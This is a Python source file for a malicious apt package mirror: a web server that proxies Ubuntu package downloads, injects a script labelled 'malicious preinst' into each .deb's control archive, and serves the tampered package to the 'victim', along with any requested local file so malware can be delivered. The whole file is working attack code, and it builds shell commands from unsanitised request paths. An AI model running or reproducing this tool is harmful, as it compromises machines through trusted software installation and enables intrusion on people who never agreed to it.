from http.server import BaseHTTPRequestHandler, HTTPServer
from scapy.all import get_if_addr
import requests
import os
import os.path

base_url = "http://nl.archive.ubuntu.com"

class Server(BaseHTTPRequestHandler):
    # accept get requests
    def do_GET(self):
        print("request:", self.path)

        # check if request is for an ubuntu package
        if "ubuntu/pool" in self.path:
            # get the requested package from the specified ubuntu mirror
            r = requests.get(base_url + self.path)

            # create response with status 200 and the same headers as r
            self.send_response(200)
            for header in r.headers.keys():
                self.send_header(header, r.headers[header])
            self.end_headers()

            # parse the filename from the request
            package_filename = self.path.split("/")[-1]

            # create the deb file by writing the received bytes
            try:
                package = open(package_filename, "xb")
                package.write(r.content)
                package.close()
            # ignore this step if we already have the package
            except FileExistsError:
                pass

            # extract deb files
            print("extract deb files")
            os.system("ar x {} --output extracting_area".format(package_filename))

            # unzip control.tar.xz
            print("unzip control.tar.xz")
            os.system("tar xf ./extracting_area/control.tar.xz --directory=control")

            # checks whether preinst exists in control already
            print("check for preinst")
            if(not os.path.exists("control/preinst")):
                # add malicious preinst to control if it does not exist
                print("add malicious preinst")
                os.system("cp ./malware/install ./control/preinst")
            else:
                # if preinst already exists copy created preinst into the exisiting one
                print("add to existing preinst")
                os.system("cat ./malware/install >> ./control/preinst")

            # change working directory to control, this makes sure we add just the files
            # e.g.: "preinst" rather than "control/preinst" in the archive
            os.chdir("./control/")

            # put files back in archive
            print("add files to control")
            os.system("tar cfJ ../extracting_area/control.tar.xz ./*")

            # change back the working directory
            os.chdir("../")

            # add control back to the deb
            print("add control to deb")
            os.system("ar r {} ./extracting_area/control.tar.xz".format(package_filename))

            # remove extracted files from working directories
            print("clean working directories")
            os.system("rm ./control/*")
            os.system("rm ./extracting_area/*")

            # read bytes from corrupted deb file
            f = open("{}".format(package_filename), "rb")
            content = f.read()

            # send corrupted deb file to victim
            print("send to victim")
            self.wfile.write(content)
            f.close()

            # remove the corrupted deb file
            print("remove deb file\n")
            os.system("rm ./{}".format(package_filename))
        elif "ubuntu/dists" in self.path:
            # if ubuntu/dists is in the request, the victim is using apt update
            print("apt update")

            # get requested update
            r = requests.get(base_url + self.path)

            # create response with status 200 and the same headers as r
            self.send_response(200)
            for header in r.headers.keys():
                self.send_header(header, r.headers[header])
            self.end_headers()

            # forward to victim
            self.wfile.write(r.content)
        else:
            # if the request is not for an ubuntu package we try to send the requested file
            # this is so we can send the malware to the victim
            self.send_response(200)
            self.end_headers()
            f = open("." + self.path, "rb")
            content = f.read()
            self.wfile.write(content)
            f.close()

def start_server(iface):
    try:
        # create working directories (-p makes it pass if it exists)
        os.system("mkdir -p control")
        os.system("mkdir -p extracting_area")

        # get our current IP address
        ip = get_if_addr(iface)
        # port has to be 80 for apt
        port = 80

        # start the webserver
        web_server = HTTPServer((ip, port), Server)
        print("Server started at {}:{}\n".format(ip, port))

        try:
            web_server.serve_forever()
        except KeyboardInterrupt:
            web_server.server_close()
            print("Server stopped")
    except Exception:
        import traceback
        print(traceback.format_exc())
